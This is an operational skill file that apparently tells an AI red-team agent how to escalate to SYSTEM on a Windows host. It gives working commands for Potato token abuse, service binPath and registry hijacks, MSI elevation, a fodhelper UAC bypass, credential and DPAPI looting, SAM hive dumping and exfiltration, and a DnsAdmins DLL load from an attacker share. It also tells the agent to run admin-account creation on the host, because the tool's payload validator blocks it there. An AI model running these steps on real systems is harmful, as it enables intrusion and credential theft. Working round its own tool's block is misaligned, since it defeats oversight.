---
name: playbook-windows-privesc
description: Windows local privilege escalation on a shell you already have — enumerate token privileges and groups, then work the vectors (SeImpersonate→Potato, service misconfig, AlwaysInstallElevated, UAC bypass, autorun/task hijack, saved-credential looting, SAM+SYSTEM dump). Load when you have a non-SYSTEM shell on a Windows host (network/red-team lane). LOLBAS staging defers to lookup_lolbas.
prerequisite: An interactive or semi-interactive shell on a Windows target (reverse shell, WinRM, web-RCE foothold, RunasCs pivot). This is the network/red-team lane — evidence is the operator log, not a Burp logger_index.
stop_condition: Two full enumeration passes (manual token/service/registry triage + winPEAS) with no writable-by-you SYSTEM primitive AND no reusable credential → record what you mapped to the operator log and pivot (lateral movement via playbook-ad-lateral-delegation.md, a kernel/authz CVE, or a different host).
---

# Windows Local Privilege Escalation Playbook

Load when: you hold a **non-SYSTEM / non-admin shell** on a Windows host and want SYSTEM (or a lateral pivot). Foothold-host work is Burp-blind — record evidence with `record_redteam_action` / `record_loot`, crack with `crack_hashes`, and reuse creds with `record_credential` (the network lane's capture→crack→reuse loop). Cite operator-log ids, never a `logger_index`.

For **domain** escalation once you have SYSTEM or a service-account context (delegation, RBCD, DCSync, AD CS, DACL abuse), this playbook hands off to `playbook-ad-lateral-delegation.md` — see especially its §6 (foothold-host bridge to SYSTEM). This file is the *local* half: get from low-priv user to SYSTEM/admin on the box in front of you.

## SMART MOVE — first three actions

1. **`whoami /priv` and `whoami /groups`** (§1) — token privileges decide the fastest path. `SeImpersonatePrivilege` present (service accounts, IIS `iis apppool\*`, MSSQL `svc_*`) is a near-instant SYSTEM via the Potato family (§2.1). Read the token before anything else.
2. **Drop winPEAS** for the automated sweep (`winPEASx64.exe` — service ACLs, unquoted paths, AlwaysInstallElevated, autoruns, saved creds, DPAPI blobs). Run it AFTER a quick manual triage so you know what it is confirming.
3. **Fast manual triage** (§1) then work the vectors §2 in ROI order: **token/Potato → service misconfig → AlwaysInstallElevated → autorun/task hijack → saved-credential looting**. UAC bypass (§2.4) is for an admin-but-medium-integrity context, not a low-priv user.

Rules 5-9 (`.claude/rules/hunting.md`) stay HARD here: this is escalation on an authorized target, not payload crafting — but the destructive denylist still applies. A service-binPath / task / MSI proof runs a **confirmation** command (a benign `whoami`/beacon, a SUID-equivalent proof, an admin add only if the RoE permits it), never `format`, `shutdown`, or data destruction. `run_network_tool` also refuses `net user … /add` / `net localgroup administrators /add` via `validate_payload` — stage those on-host, under RoE, when adding an admin account is the sanctioned proof.

## §1 Fast triage — command → what you are hunting

Run top-to-bottom; each line is one signal, not a full scan.

| Command | Escalation signal you are hunting |
|---|---|
| `whoami /priv` | **SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege** → Potato (§2.1); `SeBackupPrivilege`/`SeRestorePrivilege` → read SAM/SYSTEM (§2.6); `SeDebugPrivilege` → LSASS; `SeLoadDriverPrivilege`, `SeTakeOwnershipPrivilege` |
| `whoami /groups` | membership in **Administrators** but medium integrity → UAC bypass (§2.4); `BUILTIN\Backup Operators`, `Server Operators`, `DnsAdmins`, `Hyper-V Administrators` = group-based roots |
| `whoami /all` | SID history, integrity level (`Mandatory Label\...`), privileges + groups in one shot |
| `systeminfo` / `[System.Environment]::OSVersion` | OS build → kernel/authz CVE path (`lookup_cve`); missing hotfixes for a known LPE |
| `sc query` / `Get-Service` | running services → cross-ref writable binary/ACL/unquoted path (§2.2) |
| `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` + same under `HKCU` | **both = 0x1** → any MSI runs as SYSTEM (§2.3) |
| `schtasks /query /fo LIST /v` + `Get-ScheduledTask` | task running as SYSTEM/admin whose action script or binary is writable by you (§2.5) |
| `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` + `HKCU\...\Run` + startup folders | writable autorun target = execution as whoever logs in (§2.5) |
| `cmdkey /list` | saved credentials usable with `runas /savecred` (§2.6) |
| `dir /a /s C:\Users\*\*.kdbx *.config web.config unattend.xml *.ps1 2>nul` (or `Get-ChildItem -Recurse -Include`) | creds in config/unattend/KeePass/PowerShell history (§2.6) |
| `netstat -ano` / `Get-NetTCPConnection -State Listen` | 127.0.0.1-only services nmap never saw — DB, admin UI, backup daemon → forward + interrogate |

winPEAS / PowerUp / SharpUp / Seatbelt automate all of the above — run one after the manual pass. `PowerUp.ps1` → `Invoke-AllChecks`; `SharpUp.exe audit`.

## §2 The vectors (ROI order)

### 2.1 Token impersonation → the Potato family (SeImpersonate / SeAssignPrimaryToken)

If `whoami /priv` shows **SeImpersonatePrivilege** or **SeAssignPrimaryTokenPrivilege** enabled, you can impersonate a SYSTEM token a privileged service hands you and spawn a SYSTEM process. Pick the variant by Windows build — they differ only in how they *coax* the SYSTEM auth:

- **PrintSpoofer** — modern default (Server 2016/2019, Win10/11) where the print spooler is reachable. `PrintSpoofer64.exe -i -c cmd` (interactive) or `-c "<proof cmd>"`.
- **GodPotato** — the broadest current pick, covers Server 2012→2022 / Win8→11 via a DCOM/RPC OXID trick. `GodPotato-NET4.exe -cmd "cmd /c whoami"`. Use when PrintSpoofer's spooler path is unavailable.
- **JuicyPotatoNG** — successor to JuicyPotato for newer builds where the original CLSID trick was patched (Server 2019+/Win10 1809+). Good when GodPotato is flagged and a usable CLSID exists.
- **RoguePotato** — Server 2019 / Win10 1809+ where you can reach a redirector (`-r <your-ip>` OXID resolver on 135). Use when the box blocks the local OXID resolver.
- **SharpEfsPotato** — MS-EFSR coercion variant; works where the spooler is disabled but EFSRPC is reachable. `SharpEfsPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami"`.
- **JuicyPotato** (legacy) — only ≤ Server 2016 / Win10 1803; the classic CLSID BITS trick, patched on newer builds.

Rule of thumb: **PrintSpoofer first, GodPotato as the universal fallback, RoguePotato/SharpEfsPotato when the spooler is off.** Stage the binary with a LOLBAS downloader (`lookup_lolbas("curl")` / `lookup_lolbas("certutil", "download")` / `lookup_lolbas("bitsadmin", "download")` — prefer `curl.exe`/`bitsadmin`/`esentutl` over EDR-loud `certutil`). Confirm SYSTEM with `whoami` from the spawned process, not by assuming exit code.

### 2.2 Service misconfiguration

Three distinct defects — check each against every non-default service (`sc query` / `Get-Service`):

- **Unquoted service path** — a service `ImagePath` with spaces and no quotes (`C:\Program Files\Some App\svc.exe`) lets Windows try `C:\Program.exe`, `C:\Program Files\Some.exe`, … If you can write to an earlier segment, drop a proof binary there and restart. Find them: `wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """` (PowerUp: `Get-UnquotedService`).
- **Weak service binary / ACL** — you have write over the service's `binPath` file, or `SERVICE_CHANGE_CONFIG` over the service. Repoint it and restart:
  ```
  sc qc <svc>                                            # inspect current binPath + start type
  sc config <svc> binPath= "C:\Windows\Temp\proof.exe"   # requires SERVICE_CHANGE_CONFIG
  sc stop <svc> & sc start <svc>                          # or wait for auto-start / trigger
  ```
  Check ACLs with `accesschk.exe -uwcqv <user> <svc>` (or PowerUp `Get-ModifiableService`). The `binPath` target runs as the service account (often `LocalSystem`). Keep the proof benign — Rules 5-9.
- **Weak service registry ACL** — you can write the service's key under `HKLM\SYSTEM\CurrentControlSet\Services\<svc>` even without `sc` rights. Set `ImagePath` directly:
  ```
  reg query HKLM\SYSTEM\CurrentControlSet\Services\<svc>
  reg add HKLM\SYSTEM\CurrentControlSet\Services\<svc> /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\Temp\proof.exe" /f
  ```
  (PowerUp: `Get-ModifiableRegistryAutoRun` / `Get-RegistryAlwaysInstallElevated`.)

### 2.3 AlwaysInstallElevated (MSI as SYSTEM)

Both registry values must read `0x1`:
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
If both are set, any MSI runs elevated. Build a proof MSI (`msfvenom -f msi` under RoE, or a benign custom-action MSI that runs `whoami > C:\Windows\Temp\p.txt`), stage it, and install:
```
msiexec /quiet /qn /i C:\Windows\Temp\proof.msi
```
`lookup_lolbas("msiexec")` for the LOLBAS forms. `msfvenom` install/usage: `redteam_tool_guide(tool="msfvenom")`.

### 2.4 UAC bypass via fodhelper (admin-in-medium-integrity only)

This is NOT a low-priv-user escalation — it applies when you are already in the **Administrators** group but running at medium integrity (a common state after a phishing/beacon foothold as a local admin). `fodhelper.exe` is a Microsoft-signed auto-elevating binary that reads a user-writable registry path with no `DelegateExecute` verb check:
```
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe /c C:\Windows\Temp\proof.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /f
fodhelper.exe                                            # spawns your command high-integrity
reg delete "HKCU\Software\Classes\ms-settings" /f        # cleanup (OPSEC)
```
Confirm the spawned process integrity (`whoami /groups` → `High Mandatory Level`). Clean the registry key afterward.

### 2.5 Writable autorun / scheduled-task hijack

- **Scheduled task** running as SYSTEM/admin whose action file you can overwrite: `schtasks /query /fo LIST /v | findstr /i "TaskName Run As User"` → check the action's script/binary ACL (`accesschk.exe -quvw "<path>"`). Overwrite with a proof payload; catch it on next trigger (or `schtasks /run /tn "<task>"` if you can invoke it).
- **Autorun** (`HKLM\...\Run`, `HKCU\...\Run`, `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`): a writable target executes as whoever next logs in — a user-context pivot to a higher-priv account, not a direct SYSTEM path (same shape as the AD playbook's COM/CLSID hijack in §6).

### 2.6 Saved-credential looting (DPAPI / cmdkey / runas / config files)

Highest-linkage vector — a looted secret often unlocks a *different*, higher-value account (same discipline as the AD reuse-spray in `playbook-ad-lateral-delegation.md` §1a):

- **cmdkey / runas** — `cmdkey /list` shows stored creds; use them without knowing the plaintext: `runas /savecred /user:<admin> "C:\Windows\Temp\proof.exe"`.
- **DPAPI blobs** — decrypt masterkeys + credential/vault/browser blobs from `C:\Users\<u>\AppData\Roaming\Microsoft\{Protect,Credentials}` and Chrome/Edge `Login Data`. Loot the blob + masterkey, then decrypt **offline** on Kali: `record_loot` them, then `run_network_tool(tool="impacket-dpapi", args="masterkey -file <mk> -sid <userSID> -password '<pw>'")` and `impacket-dpapi credential -file <blob> -key <mk>`. Full flow: `redteam_tool_guide(tool="dpapi")` (ATT&CK T1555).
- **Config / unattend / history files** — `findstr /si password *.xml *.ini *.config *.txt`, `unattend.xml` / `sysprep.xml` (base64 admin pw), `web.config` connection strings, `Groups.xml` (GPP cpassword), PowerShell history (`(Get-PSReadlineOption).HistorySavePath`), `.git-credentials`, KeePass `.kdbx`. Every secret → `record_credential(domain, user, secret, secret_type="password")` + `record_loot`, then reuse it (WinRM/RDP/SMB/local DBs).

Local SAM + SYSTEM hive dump (local-account hashes → PtH / offline crack):
- On-host, LOLBAS-native (`lookup_lolbas("reg", "dump")`): 
  ```
  reg save HKLM\SAM  C:\Windows\Temp\sam.hive
  reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
  reg save HKLM\SECURITY C:\Windows\Temp\sec.hive        # LSA secrets / cached domain creds
  ```
  (`SeBackupPrivilege` reads the live hives even when locked; `reg.exe` note in the LOLBAS seed points at the offline parse.)
- Exfil the hives, then parse **offline** on Kali (no target traffic — Rules 5-7 clear):
  ```
  run_network_tool(tool="impacket-secretsdump",
                   args="-sam sam.hive -system system.hive -security sec.hive LOCAL")
  ```
  → local hashes → `record_loot(domain, "ntlm_hash", ...)` → PtH (`nxc smb -H <hash>` / `evil-winrm -H`) or `crack_hashes(domain, "ntlm", ...)`.
- For **domain** NTDS.dit on a DC, the LOLBAS seed also carries `esentutl_ntds` (`esentutl /y /vss`), `vssadmin`, `ntdsutil` (IFM), and `diskshadow` — that path belongs to the DC-compromise stage in `playbook-ad-lateral-delegation.md` §4.

## §3 Group-based roots (instant if you're a member — check `whoami /groups` first)

- **Backup Operators** → `SeBackupPrivilege` reads any file: dump SAM/SYSTEM (§2.6) or NTDS.dit on a DC without admin.
- **DnsAdmins** → load a malicious DLL via the DNS service (`dnscmd /config /serverlevelplugindll \\attacker\x.dll`; runs as SYSTEM on service restart). RoE-dependent — noisy.
- **Server Operators** → reconfigure a service `binPath` (§2.2) — you have `SERVICE_CHANGE_CONFIG` domain-wide.
- **Hyper-V Administrators** / **Print Operators** / **Event Log Readers** → each has a documented abuse; enumerate the specific right and cross-ref `lookup_cve` / the vector sections above.

## §4 Kernel / authz CVE path (last, or when config vectors are dry)

`systeminfo` build number → `lookup_cve(product, version)` + Watson/WES-NG for missing hotfixes. Examples: **PrintNightmare** (CVE-2021-34527, spooler), **HiveNightmare/SeriousSAM** (CVE-2021-36934, world-readable SAM shadow copies), a token/authz kernel LPE matched to the exact build. Verify the PoC matches the precise build before firing (offsets differ per build; a public PoC for build A on build B usually needs an offset fix, not a "not vulnerable"). Kernel exploits can bugcheck the box — prefer a config/cred path first; keep the kernel PoC as the fallback.

## Evidence + Praetor integration

- Every meaningful action → `record_redteam_action(domain, tool=..., command=..., description=..., target=<host>)`. Auto-ATT&CK tags fire for the tools in the oplog map — `winpeas` (T1082), `secretsdump` (T1003 OS Credential Dumping), `dpapi` (T1555), `runascs` (T1134.002 Create Process with Token), `certutil`/`bitsadmin` staging (T1105). For **on-host** escalations the oplog does not auto-tag (Potato, `sc config`, fodhelper, MSI abuse run on the target, not via `run_network_tool`) — name the technique in `description=` so the report and Navigator layer carry it: Potato → T1134.001/002 (token impersonation), service abuse → T1543.003/T1574.011, AlwaysInstallElevated → T1548.002, UAC bypass → T1548.002, task/autorun → T1053.005/T1547.001, SAM dump → T1003.002.
- Captured hash / DPAPI blob / cred → `record_loot(domain, loot_type, value, source_host=...)` (chain-of-custody, sha256, redacted shape), then `crack_hashes` / offline `impacket-dpapi` → `record_credential`.
- Reuse the cred everywhere (host + network lane): `list_credentials(domain)` feeds `run_network_recon(target, creds="DOM/user:pass")` and the AD lateral playbook.
- Forward the kill chain: `sync_to_ghostwriter(domain)` (operator-log timeline + findings).

## Tools

Enumeration: **winPEAS** (`winPEASx64.exe` — run after a manual pass), **PowerUp** (`Invoke-AllChecks`), **SharpUp** (`audit`), **Seatbelt**, **accesschk** (service/file/registry ACLs — `-uwcqv`). Escalation binaries (stage on-host via `lookup_lolbas` downloaders): PrintSpoofer / GodPotato / JuicyPotatoNG / RoguePotato / SharpEfsPotato. LOLBAS staging + on-host dumping: `lookup_lolbas(binary, function=...)` (`curl`/`bitsadmin`/`esentutl` download, `reg`/`vssadmin`/`ntdsutil`/`esentutl_ntds`/`diskshadow` dump). Offline parse/decrypt (Kali, through `run_network_tool`): `impacket-secretsdump … LOCAL`, `impacket-dpapi` (`redteam_tool_guide(tool="dpapi")`). Context pivot with a recovered cred: `runascs` (`redteam_tool_guide(tool="runascs")`). Cracking: `crack_hashes(domain, "ntlm", ...)`. CVE path: `lookup_cve`, WES-NG / Watson. Domain escalation once you hold SYSTEM/a service account: `playbook-ad-lateral-delegation.md`.
